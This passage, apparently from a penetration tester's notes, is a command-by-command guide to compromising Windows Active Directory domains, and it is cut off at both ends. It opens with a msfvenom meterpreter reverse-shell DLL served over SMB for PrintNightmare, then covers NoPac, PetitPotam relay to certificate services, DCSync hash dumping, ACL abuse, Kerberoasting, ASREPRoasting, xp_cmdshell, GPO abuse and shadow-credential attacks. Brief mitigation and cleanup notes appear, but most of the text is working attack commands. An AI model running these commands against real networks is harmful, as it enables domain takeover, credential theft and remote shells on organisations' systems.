msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=PORT -f dll > shell.dll

msfconsole
msf5 > use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport PORT
set lhost x.x.x.x
run

```
Set up an SMB file share in the same directory that the malicious dll file is in:
```bash
impacket-smbserver share `pwd` -smb2support

impacket-smbserver -smb2support CompData /path/to/malicious.dll

```
Now that the attacking machine is hosting the malicious dll file, input the domain controller and obtained user credentials through the following command:
```bash
python3 CVE-2021-1675.py DOMAIN.CONTROLLER/username:password@x.x.x.x '\\LHOST IP ADDRESS\share\shell.dll'

```
If successfully exploited, the msfconsole handler should have a shell connection. Sometimes, however, the antivirus on the AD server will prevent connections so the malicious dll file will need to be obfuscated.

To prevent this attack, the Spooler service needs to be stopped via powershell on the AD server:
```powershell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```

<a id="activedirnopac"></a>

#### **`NoPac (SamAccountName Spoofing)`**

This attack was released at the end of 2021, encompassing the CVEs 2021-42278 and 2021-42287. This attack allows for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. 
* **2021-42278:** Bypass vulnerability with the Security Account Manager (SAM)
* **2021-42287:** Vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a domain controller. By default, authenticated users can add up to 10 computers to a domain; when doing so, the name of the new host is changed to match a domain controller's SamAccountName. Once done, Kerberos tickets can be requested causing the service to issue the attacker tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. This will give the attacker access as that service, and can be provided with a SYSTEM shell on a domain controller. 


The [NoPac](https://github.com/Ridter/noPac) tool uses many scripts in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target domain controller, so the Impacket suite must be downloaded in addition to the noPac tool. Once installed, use the scanner.py tool to see if the system is vulnerable; the scanner can be used with a standard domain user account to attempt to obtain a TGT from the target domain controller:
```bash
sudo python3 scanner.py domain.controller/username:password -dc-ip x.x.x.x -use-ldap

```
If vulnerable, the **`ms-DS-MachineAccountQuota` number will be set to 10.** If this value is set to 0, the attack will fail because the user does not have the rights to add a new machine account. If the value is set to 10, however, there are a few ways to use NoPac to further access. One way is to obtain a shell with SYSTEM level privileges. This can be done by running noPac.py with the following syntax to impersonate the built-in administrator account and drop into a semi-interactive shell session via impacket-smbexec on the target domain controller. It is important to note that this may be blocked by AV or EDR:
```bash

sudo python3 noPac.py domain.controller/username:password -dc-ip x.x.x.x -dc-host hostname-of-device -shell --impersonate administrator -use-ldap

```
Impacket-smbexec shells require the exact paths instead of navigating the directory structure using cd, hence it being semi-interactive. This tool does not save the TGT in the directory on the attack host where the exploit was run; use ls to confirm. Regardless, there will be a `*.ccache` file that can be used to perform a pass-the-ticket attack and potentially other attacks. The `-dump` flag can be used to perform a DCSync attack using impacket-secretsdump, but would still create a ccache file on disk, which may need to be removed after use:
```bash
sudo python3 noPac.py domain.controller/username:password -dc-ip x.x.x.x -dc-host hostname-of-device --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator

```

**<u>Windows Defender & SMBEXEC.py Considerations</u>**

If Windows Defender (or another AV or EDR product) is enabled on a target, the shell session may be established, but issuing any commands will likely fail. The first thing `impacket-smbexec` does is create a service called BTOBTO. Another service called BTOBO is created, and any typed command is sent to the target over SMB inside a .bar file called execute.bat. With each new typed commands, a new batch script is created and echoed to a temporary file that executes said script and deltes it from the system. 

<a id="activedirpetitpotam"></a>

#### **`PetitPotam (MS-EFSRPC)`**

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in 2021. The flaw allows an unauthenticated attacker to coerce a domain controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft's Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where AD Certificate Services (AD CS) is in use. 

In the attack, an authentication request from the targeted domain controller is relayed to the Certificate Authority host's Web Enrollment page and makes a CSR for a new digital certificate. This certificate can then be used with a tool like Rubeus or [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools) to request a TGT for the domain controller, which can then be used to achieve domain compromise via a DCSync attack. 

First, start `impacket-ntlmrelayx` in one window, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If the location of the CA is unknown, use [certi](https://github.com/zer1t0/certi) to attempt to locate it:
```bash
sudo impacket-ntlmrelayx -debug -smb2support --target http://hostname.DOMAIN.CONTROLLER/certsrv/certfnsh.asp --adcs --template DomainController
```
Once the servers are started and waiting for connections, run [PetitPotam.py](https://github.com/topotam/PetitPotam) from another window. To coerece the domain controller to authenticate the attack host (that is running impacket-ntlmrelayx), use the following syntax:
```bash
python3 PetitPotam.py <attack host IP> <Domain Controller IP>

```
This can also be done from Mimikatz, or from the [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1) tool:
```powershell
misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>

```
If this works, check the impacket-ntlmrelayx tab to see if there is a successful login request. A base64 encoded certificate for the domain controller will also be output if the attack is successful. Take the base64 certificate and use gettgtpkinit.py to request a TGT for the domain controller:
```bash
python3 gettgtpkinit.py DOMAIN.CONTROLLER/HOSTNAME\$ -pfx-base64 <base64 encoded cert>
```
The requested TGT will be saved as a `*.ccache` file, which will now be used to set the KRB5CCNAME environment variable. The attack host can use this file for Kerberos authentication attempts. The TGT can be used with impacket-secretsdump to perform a DCSync attack and retrieve one or all of the NTLM password hashes for the domain:
```bash
export KRB5CCNAME=dc01.ccache

impacket-secretsdump -just-dc-user DOMAINCONTROLLER/administrator -k -no-pass "HOSTNAME$"@HOSTNAME.DOMAIN.CONTROLLER

impacket-secretsdump -just-dc-user DOMAINCONTROLLER/administrator -k -no-pass HOSTNAME.DOMAIN.CONTROLLER  #simpler than previous
```
Finally, confirm admin access to the domain controller by using the NT hash for the built-in administrator account to authenticate to the domain controller. From here, there will be complete control over the domain, persistence can be established, or sensitive data can be searched for:
```bash
crackmapexec smb x.x.x.x -u administrator -H <NT Hash>

```
Also, once the TGT is obtained from the target, [getnthash.py](https://github.com/dirkjanm/PKINITtools) can be used to request the NT hash for the target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key obtained when requesting the previous TGT:
```bash
python getnthash.py -key <AS-REP encryption key> DOMAIN.CONTROLLER/HOSTNAME$
```
The recovered hash from this command can be used to perform a DCSync with `impacket-secretsdump` using the `-hashes` flag:
```bash
impacket-secretsdump -just-dc-user DOMAINCONTROLLER/administrator "HOSTNAME$"@x.x.x.x -hashes <NT hash>

```

Alternatively, once the base64 certificate is obtained via `impacket-ntlmrelayx`, the certificate could be used with Rubeus on a Windows attack host to request a TGT ticket and perform a pass-the-ticket attack all at once. 
```powershell
.\Rubeus.exe asktgt /user:HOSTNAME /certificate:base64_value /ptt

```
Since domain controllers have replication privileges in the domain, the pass-the-ticket can be used to perform a DCSync attack using Mimikatz from the Windows host. Grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. The NT hash for any privileged user can be obtained using DCSync:
```powershell
.\mimikatz.exe

lsadump::dcsync /user:domain\krbtgt

```

**<u>Mitigations</u>**

* **Patch Systems:** The patch for CVE-2021-36942 should be applied to any affected hosts
  * Applying the patch alone is not enough for most organizations running AD CS, as an attacker with standard domain user credentials can still perform attacks against AD CS in many instances

* **Use Extended Protection for Authentication & enable Require SSL:** This should be implemented to prevent NTLm relay attacks, and only allow HTTPS connections for the CA Web Enrollment and Certificate Enrollment Web Service Services

* **Disabling NTLM Authentication for Domain Controllers**

* **Disabling NTLM on AD CS Servers using Group Policy**

* **Disabling NTLM for IIS on AD CS Servers:** This should be done where the CA Web Enrollment and Certificate Enrollment Web Services are in use

<a id="activediraclabuse"></a>

#### **`ACL Abuse`**

Before abusing the ACL, it is imperative to conduct ACL enumeration. The following example demonstrates an **ACL attack chain** that comprimises three user accounts, starting with one account that was already compormised. Assume that a compromised user (A) has the User-Force-Change-Password ACE over another user (B). 
1. Because of this A can change the password of B and authenticate as B. By changing user Bs password, the attacker now knows their password.
2. The ACL privileges of user B were enumerated, where it was discovered that this user has GenereicWrite rights, allowing them to add a user that they control to a group. This is made possible because the attacker knows the password of user B. 
3. This group is nested into another group that provides GenericAll rights, allowing the attacker to take control of another user (C). Essenitally, the attacker adds user B to the privileged group from user A's account. With the privileges of this group, user C can be Kerberoasted.

First, authenticate as User A and force change the password of user B. This can be done by opening a PowerShell console and authenticating as user A; if already logged in as the compromised user on the Windows machine, skip this step. The following creates a PSCredential object:
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('DOMAINCONTROLLER\usera', $SecPassword) 

```
Next, create a SecureString object which represents the password that is to be set for the targer user (B):
```powershell
$userbPassword = ConvertTo-SecureString 'new_password' -AsPlainText -Force

```
Finally, use the `Set-DomainUserPassword` PowerView function to change the user's (B) password. Use the `-Credential` flag with the credential object created for user A. It is best to specify the `-Verbose` flag to get feedback on the command completing as expected or as much information about errors as possible. This can be done from a Linux host using a tool like [pth-net](https://github.com/byt3bl33d3r/pth-toolkit):
```powershell
Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity userb -AccountPassword $userbPassword -Credential $Cred -Verbose

```
This should output  whether the command completed successfully. Next, perform a similar process to authenticate as User B and add them to the nested group, which in this case is called "Help Desk":
```powershell
$SecPassword = ConvertTo-SecureString 'new_password' -AsPlainText -Force

New-Object System.Management.Automation.PSCredential('DOMAINCONTROLLER\userb', $SecPassword)

```
Now, use the `Add-DomainGroupMember` function to add user B to the target group. First confirm that the user is not a member of the target group; this could also be done from a Linux host using the pth-toolkit. If user B is not already in the group (determined by the first/second command), the third command can be run to add user B to the group:
```powershell
Get-ADGroup -Identity "Help Desk" -Properties * | Select -ExpandProperty Members

Get-DomainGroupMember -Identity "Help Desk" | Select MemberName

Add-DomainGroupMember -Identity 'Help Desk' -Members 'userb' -Credential $Cred2 -Verbose

```
At this point, the new group membership can be leveraged to take control over user C. Assume that user C is an admin account that cannot be interrupted. Since there are `GenericAll` rights over user C, a targeted Kerberoasting attack can be conducted by modifying the account's servicePrincipalName attribute to create a fake SPN that can then be Kerberoasted to obtain the TGS ticket, where the hash can potentially be cracked offline.

For this to work, the attacker must be authenticated as a member of the overarching group (not the example "Help Desk" group, but the one over it, which in this case can be called "IT"). Since user B was added to the nested group ("Help Desk"), they inherited the rights via nested group membership. The `Set-DomainObject` function can be used to create the fake SPN. From a Linux host, the [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) tool can be used to perform this attack, as it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command. However, the following commands are done via powershell:
```powershell
Set-DomainObject -Credential $Cred2 -Identity userc -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

```
If this worked, it should be possible to conduct a Kerberoasting attack against user C, using any number of methods to otain the hash for offline cracking. The following example does so with Rubeus:
```powershell
.\Rubeus.exe kerberoast /user:userc /nowrap

```
If this works, the hash will be obtained. Now, crack the password offline with Hashcat. Once the cleartext password is obtained, the attacker can authenticate as user C and leverage other attacks. 

<br>

**<u>Cleanup</u>**

From this example, the following (three) actions need to be done to properly clean up. The order is important because if the user is removed from the group first, then the attacker won't have the rights to remove the fake SPN:

**1. Remove the fake SPN created on user C**
```powershell
Set-DomainObject -Credential $Cred2 -Identity userc -Clear serviceprincipalname -Verbose

```

**2. Remove user B from the "Help Desk" group**
```powershell
Remove-DomainGroupMember -Identity "Help Desk" -Members 'userb' -Credential $Cred2 -Verbose

Get-DomainGroupMember -Identity "Help Desk" | Select MemberName |? {$_.MemberName -eq 'userb'} -Verbose     #confirm removal

```

**3. Set the password for user B back to its original value (if known) or have the client set it/alert the user**
* Remember to document any changes within the environment, and record everything done during the assessment in writing

<br>

**<u>Detection and Remediation</u>**

* **Audit For and Remove Dangerous ACLs**
   * Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed

* **Monitor Group Membership**
   * Visibility into important groups is critical. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain

* **Audit and Monitor for ACL Changes**
   * Enabling the Advanced Security Audit Policy can help in detecting unwanted changes, especially **`Event ID 5136`: A directory service object was modified,** which would indicate that the domain object was modified, an indicator of an ACL attack. 
   * Check the Details tab; it shows that the pertinent information is written in Security Descriptor Definition Language (SDDL), which is not human readable.

The `ConvertFrom-SddlString` cmdlet can be used to convert SDDL to a readable format, although this it may be a very long string. Copy the SDDL, and use it with the cmdlet:
```powershell
ConvertFrom-SddlString "sddlstring"
```
There are many tools that can be used to help monitor AD. These tools, when used in conjunction with a highly mature AD secure posture, and combined with built-in tools like those that can be used to monitor for and alert on events in AD, can help to detect these types of attacks and prevent them from going any further. 

<a id="activedirprivaccess"></a>

#### **`Privileged Access Attacks`**

Once a there is a foothold in the domain, the goal shifts to moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise. **This section focuses on moving laterally in AD.** There are several ways to move laterally; typically, if an account with local admin rights over a host, or a set of hosts, is taken over, a Pass-the-Hash attack can be performed to authenticate via the SMB protocol. However, **if the compromised user does not have local admin rights on any hosts in the domain,** there are many other ways to move around a Windows domain:
* **RDP:** A remote access/management protocol that gives GUI access to a target host

* **PowerShell Remoting (WinRM/PSRemoting):** A remote access protocol that allows commands to be run, or grants an interactive command-line session on a remote host using PowerShell

* **MSSQL Server:** An account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run OS commands in the context of the SQL Server service account through various methods

This access can be enumerated in various ways. The easiest is via BloodHound, as the following edges exist to display what types of remote access privileges a given user has: CanRDP, CanPSRemote, SQLAdmin. These privileges can also be enumerated with PowerView or built-in tools. These attacks can be conducted with a Windows or Linux attack host. It is imperative to never overlook remote access rights if the user is not a local admin on the target host, as the host may contain sensitive data or have a security misconfiguration that allows privilege escalation. 

<br>

**<u>Remote Desktop</u>**

Local admin users typically have RDP access. Sometimes, a user will not have local admin rights anywhere, but will have the rights to RDP into one or more machines. This could be useful, as it could lead to:
* Further attacks
* Privilege escalation and obtain credentials for a higher privileged user
* Pillage the host for sensitive data or credentials

Using PowerView, the `Get-NetLocalGroupMember` function can be used to begin enumerating members of the Remote Desktop Users group on a given host:
```powershell
Get-NetLocalGroupMember -ComputerName Computer-Name -GroupName "Remote Desktop Users"

```
From the MemberName portion from the output, it will either show a group or particular users that can RDP to the computer. It is common for all domain users on Remote Desktop Services (RDS) hosts or hosts used as jump hosts to have this privilege. After importing BloodHound data, check whether the Domain Users group has local admin rights or execution rights (RDP or WinRM) over 1+ hosts, and check the Domain Users Group's Local Admin & Execution Rights. 

If a user is compromised through LLMNR/NBT-NS Response Spoofing or Kerberoasting, search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab. Also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP.
* To test the access, use xfreerdp, Remmina , or mstsc.exe

<br>

**<u>WinRM</u>**

Like RDP, specific users or an entire group may have WinRM access to one or more hosts. This could also be low-privileged access that could be used to hunt for sensitive data, privilege escalation, or local admin access, all of which could potentially be leveraged to further access. Again, the `Get-NetLocalGroupMember` function in PowerView can be used to enumerate the Remote Management Users group. This group has existed since Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights:
```powershell
Get-NetLocalGroupMember -ComputerName Computer-Name -GroupName "Remote Management Users"

```
Besides this, a custom `Cypher` query in BloodHound can be used to hunt for users with this type of access. This can be done by pasting the following query into the Raw Query box at the bottom of the screen and hitting enter:
```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

```
The `Enter-PSSession`cmdlet using PowerShell from a Windows host can be used to establish a WinRM session:
```powershell
$password = ConvertTo-SecureString "password" -AsPlainText -Force

$cred = new-object System.Management.Automation.PSCredential ("DOMAINCONTROLLER\username", $password)

PS C:\htb> Enter-PSSession -ComputerName Computer-Name -Credential $cred

Exit-PSSession #to exit session 

```
On Linux, [evil-winrm](https://github.com/Hackplayers/evil-winrm) can be used:
```bash
gem install evil-winrm  #installation

evil-winrm -i x.x.x.x -u username

```
**<u>SQL Server Admin</u>**

SQL Servers are common in many AD environments. It is common to find user and service accounts set up with sysadmin privileges on a given SQL Server instance. Credentials for accounts with this access can be obtained via Kerberoasting, password spraying, LLMNR/NBT-NS Response Spoofing or by using Snaffler to find `web.config` or other types of configuration files that contain SQL server connection strings. **Whenever SQL credentials are found, test access against any MSSQL servers in the environment. This type of access is almost guaranteed SYSTEM access over a host.** If commands can be run as the account that was authenticated with, it will almost always have the `SeImpersonatePrivilege` right. 

It is easy to find this type of access via the SQLAdmin edge with BloodHound. SQL Admin Rights in the Node Info tab can be checked for a given user, or the following custom Cypher query can be used to search:
```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

```
This will show which user(s), if any, have SQL Admin Rights. If the user account can be compromised, authenticate with the target using a tool such as [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) to run OS commands. First, look for SQL server instances with the following command:
```powershell
Import-Module .\PowerUpSQL.ps1

Get-SQLInstanceDomain

```
Now, authenticate against the remote SQL server host and run custom queries or OS commands:
```powershell
Get-SQLQuery -Verbose -Instance "x.x.x.x,1433" -username "DOMAINCONTROLLER\username" -password "password" -query 'Select @@version'

```
From a Linux attack host, `impacket-mssqlclient` can be used to authenticate to the SQL server
```bash
impacket-mssqlclient DOMAINCONTROLLER/USERNAME@x.x.x.x -windows-auth

SQL> enable_xp_cmdshell    #enables the xp_cmdshell stored procedure, allowing execution of OS commands via the DB 

```
Commands can be run in the format `xp_cmdshell command`. Rights that the user has on the system can be enumerated; check if the user has the `SeImpersonatePrivilege`, as it can be leveraged in combination with tools such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to SYSTEM level privileges, depending on the target host:
```bash
xp_cmdshell whoami /priv

xp_cmdshell dir /Users
```
If these commands work, use the `/exploit/windows/mssql/mssql_payload` module on metasploit with the found credentials to get a reverse shell.

<a id="activedirasreproasting"></a>

#### **`ASREPRoasting`**

It is possible to obtain the TGT for any account that has the `Do not require Kerberos pre-authentication` setting enabled. Many vendors installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account's password, and any domain user can request it. 
* With pre-authentication, a user enters their password, encrypting a time stamp. The domain controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain 

* If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the domain controller. This can be subjected to an offline password attack using Hashcat or John. 

ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or directly in the PowerShell AD module. PowerView can enumerate users with their UAC value set to `DONT_REQ_PREAUTH`:
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

```
If any accounts are output from this command, they can be ASREPRoasted. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-authentication.


**<u>Rubeus</u>**

The attack itself can be performed with Rubeus or other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password:
```powershell
.\Rubeus.exe asreproast /user:username /nowrap /format:hashcat

```
Once the AS-REP hash is yielded, put it in a file and crack it with module 18200 in hashcat:
```bash
hashcat -m 18200 asrep_hash /path/to/wordlist

```
**<u>Kerbrute</u>**

When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication:
```bash
kerbrute userenum -d domain.controller --dc x.x.x.x /path/to/username/wordlist 

```
With a list of valid users, `Impacket-Get-NPUsers` can be used to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. A username wordlist can also be fed into the tool - it will throw errors for users that do not exist - if it finds any valid users without Kerberos pre-authentication, then it can be an easy way to obtain a foothold or move laterally/vertically:
```bash
GetNPUsers.py DOMAIN.CONTROLLER/ -dc-ip x.x.x.x -no-pass -usersfile /path/to/username/wordlist 
```

<a id="activedirgpoabuse"></a>

#### **`Group Policy Object (GPO) Abuse`**

Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, hardens the AD environment by onfiguring user settings, operating systems, and applications; however, when misconfigured, it can be abused by attackers. If an attacker gains rights over a GPO via an ACL misconfiguration, they could leverage it for lateral movement, privilege escalation, and even domain compromise as a persistence mechanism within the domain. 

GPO misconfigurations can be abused to perform the following attacks:
* Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
* Adding a local admin user to one or more hosts
* Creating an immediate scheduled task to perform any number of actions

GPO information can be enumerated with PowerView, BloodHound, [group3r](https://github.com/Group3r/Group3r) or [ADRecon](https://github.com/sense-of-security/ADRecon) to audit the security of GPOs in a domain. The following uses the `Get-DomainGPO` function from PowerView to get a listing of GPOs by name:
```powershell
Get-DomainGPO |select displayname

```
This can be helpful to see what types of security measures are in place; i.e., denying cmd.exe access and a separate password policy for service accounts. `autologon` indicates that there may be a readable password in a GPO, and `Certificate Services` indicates that AD CS is present in the domain. If Group Policy Management tools are installed on the host, various uilt-in GroupPolicy cmdlets such as Get-GPO can be used to perform the same enumeration, as follows:
```powershell
Get-GPO -All | Select DisplayName

```
Next, check if the compromised user has any rights over a GPO. Specific users or groups may be granted rights to administer 1+ GPOs. A good first check is to see if the entire Domain Users group has any rights over 1+ GPOs:
```powershell
$sid=Convert-NameToSid "Domain Users"

Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

```
Look at the ActiveDirectoryRights that the Domain Users group has permissions over. If `WriteProperty` or `WriteDacl` are listed, they could be leveraged to gain full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. Similarly, the GPO GUID (listed as the alphanumeric ObjectDN value) combined with Get-GPO can be used to see the display name of the GPO:
```powershell
Get-GPO -Guid long-alphanumeric-string-value

```
If done in BloodHound, check to see what GPO rights the Domain Users group has. This can be done by selecting the GPO in BloodHound, and scrolling down to Affected Objects on the Node Info tab. 

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) can also be used to take advantage of GPO misconfigurations by performing malicious actions, such as adding a compromised user to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to get a reverse shell, or by configuring a malicious computer startup script to get a reverse shell. However, be careful when running this tool, as every computer within the OU that the GPO is linked to can be affected.

<a id="activedircertificateservabuse"></a>

#### **`Certificate Services (AD CS) Abuse`**

If the compromised user has some form of access (i.e., ACL or credentials) to another user that manages certificates (i.e., Certificate Authority), it can potentially be leveraged to escalate privileges. This access can be enumerated with BloodHound or PowerView. 

If the compromised user has an ACL right over the user that manages certificates, there can be several attack vectors depending on the exact right; all of which can be determined through BloodHound (right-click privilege, press help, check abuse methods). The `WriteOwner` privilege, for example, can enable the (already compromised) user to change the password of the certificate service account, perform a targeted kerberoast, or a shadow credential attack. To change the password of the certificate service account, the more privileged, already compromised user must also have the right to change the password (Set-DomainUserPassword) of the certificate service account. 

<br>

**<u>Shadow Credential Attack</u>** 

It is necessary to have the credentials of the compromised user to perform this attack (entire NTLM hash or cleartext password). Remove the password positional argument and specify the entire NTLM hash (LM:NT) after the `-hashes` flag

**1. Change Ownership of Certificate Service Account**
```bash
impacket-owneredit -action write -new-owner 'compromised_user' -target 'cert_user' -dc-ip x.x.x.x 'domain.controller'/'compromised_user':'password'

```
**2. Change Permissions of Account**
```bash
impacket-dacledit -action write -rights 'FullControl' -principal 'compromised_user' -target 'cert_user' -dc-ip x.x.x.x 'domain.controller'/'compromised_user':'password'

```
**3. Create Certificate:** [PyWhisker](https://github.com/ShutdownRepo/pywhisker) may require using a virtual environment. This command adds a new KeyCredential to the msDs-KeyCredentialLink:
```bash
python pywhisker.py --dc-ip x.x.x.x -d domain.controller -u compromised_user -p password --target "cert_user" --action "add" --filename HostCert --export PEM

```
**4. Export Certificate:** The previous command should have generated a self-signed PEM certificate and key. The specified word after the filename flag, which in this case is HostCert, will have _cert appended to it if it is the certificate and _priv appended to it if it is the key. The following commands use kerberos [PKINIT](https://github.com/dirkjanm/PKINITtools/tree/master) to output a TGT into the specified cache (cert_user.ccache in this case):
```bash
python3 gettgtpkinit.py -dc-ip x.x.x.x -cert-pem HostCert_cert.pem -key-pem HostCert_priv.pem domain.controller/cert_user cert_user.ccache

export KRB5CCNAME=cert_user.ccache

```
**5. Get Hash:** The previous command should have output the ASREP encryption key. This value needs to be copied to submit a TGS request for the certificate service account. After running this command, the NT hash of the certificate service account will be output:
```bash
python3 getnthash.py -dc-ip x.x.x.x  domain.controller/cert_user -key <key from previous command output>

```
**6. Enumerate Vulnerable Certificate Templates:** With the NT hash of the service account, get more information about the certificate services. This could also be enumerated with the compromised user that has some access over the certificate service account (2) to get files for BloodHound. If the first command does not display which templates are vulnerable, manual enumeration must be performed by adding the `-old-bloodhound` flag or there are no vulnerable certificate templates (try to write a new one or find another tactic):
```bash
certipy-ad find -u cert_user -hashes <NT hash> -dc-ip x.x.x.x -target domain.controller -vulnerable 

certipy-ad find -u compromised_user -p password -dc-ip x.x.x.x -target domain.controller -old-bloodhound

```
Find the exact name of the CA from the previous command and a writable template. This is best done with the `vulnerable` flag or by uploading the ingested data to BloodHound. BloodHound is the best option, as it discloses users in privileged groups that can be compromised in the 8th step.

**7. Backup Original Certificate Template:** This is not necessary if this is for a CTF, but it is for actual pentests. 
```bash
certipy-ad template -u cert_user -hashes <NT hash> -template vulnerable_template_name -dc-ip x.x.x.x -target domain.controller -save-old

```
**8. Get .pfx File of a Privileged User:** Request the certificate of the default Administrator account first. If this does not work, try other privileged accounts that were previously enumerated:
```bash
certipy-ad req -u cert_user -hashes <NT hash> -dc-ip x.x.x.x -target hostname.domain.controller -ca certificate_authority_name -template vulnerable_template_name -upn administrator@domain.controller -dns domain.controller

```
**9. Get the NTLM Hash of the Privileged User**
```bash
certipy-ad auth -pfx administrator_domain.pfx -dc-ip x.x.x.x -username administrator -domain domain.controller

```
**10. Authenticate to the Domain Controller** 
```bash
impacket-psexec administrator@x.x.x.x -hashes <NTLM hash of privileged user>
```

<a id="activedirattackingdomaintrusts"></a>

#### **`Attacking Domain Trusts`**

When organizations acquire other organizations, they typically establish a trust relationship with the new domain for ease of use. In doing so, integration is made quicker because all the established objects do not need to be migrated. This trust, however, can introduce weaknesses into the customer's environment if they are not careful. Companies may also establush trusts with other companies (such as an MSP), a customer, or other business units of the same company. 

A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way communication. An organization can create various types of trusts:
* **`Parent-child`:** Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain *child.domaincontroller.local* could authenticate into the parent domain *domaincontroller.local*, and vice-versa

* **`Cross-link`:** A trust between child domains to speed up authentication

* **`External`:** A non-transitive trust etween two separate domains in separate dorests which are not already joined by a forest trust. This type of trust uses SID filtering or filters out authentication requests (by SID) not from the trusted domain 

* **`Tree-root`:** A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when a new tree root domain is set up within a forest

* **`Forest`:** A transitive trust between two forest root domains

* **`ESAE`:** A bastion forest used to manage AD

Trusts can be:

**1. Transitive:** Trust is extended to objects that the child domain trusts. For example, there are three domains: A, B, and C. If A has a trust with B, and B has a transitive trust with C, then A will automatically trust C
   * Shared, 1 to many
   * The trust is shared with anyone in the forest
   * Forest, tree-root, parent-child and cross-link trusts are transitive

**2. Non-Transitive:** The child domain itself is the only one trusted
   * Direct trust
   * Not extended to the next level child domains
   * Typical for external or custom trust setups

Also trusts can be set up in two directions: **one-way** or **two-way (bidirectional).** In **`One-way trusts`,** users in a trusted domain can access resources in a trusting domain, not vice-versa. In **`Bidirectional trusts`,** users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between *domaincontroller1.local* and *domaincontroller2.local*, users in *domaincontroller1.local* would be able to access resources in *domaincontroller2.local*, and vice-versa.

<a id="activedirattackingdomaintrustslinux"></a>

##### **`Attacking Domain Trusts (Linux)`**

<center>

**<u>Child -> Parent Trusts (ExtraSids Attack)</u>**

</center>

To compromise a parent domain from a child domain, the following information is required:

**1. The KRBTGT Hash for the Child Domain:** Once a child domain is entirely compromised, impacket-secretsdump can be used to DCSync and grab the NTLM hash for the KRBTGT account
```bash
impacket-secretsdump child.domaincontroller.local/username@x.x.x.x -just-dc-user CHILD/krbtgt

```
**2. The SID for the Child Domain:** impacket-lookupsid can be used to perform SID brute forcing to find the SID of the child domain. In this command, the specified IPP address will become the target domain for a SID lookup, so the IP address of the domain controller in the child domain should be specified. This tool yields the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID, but for this purpose, only the domain SID is needed
```bash
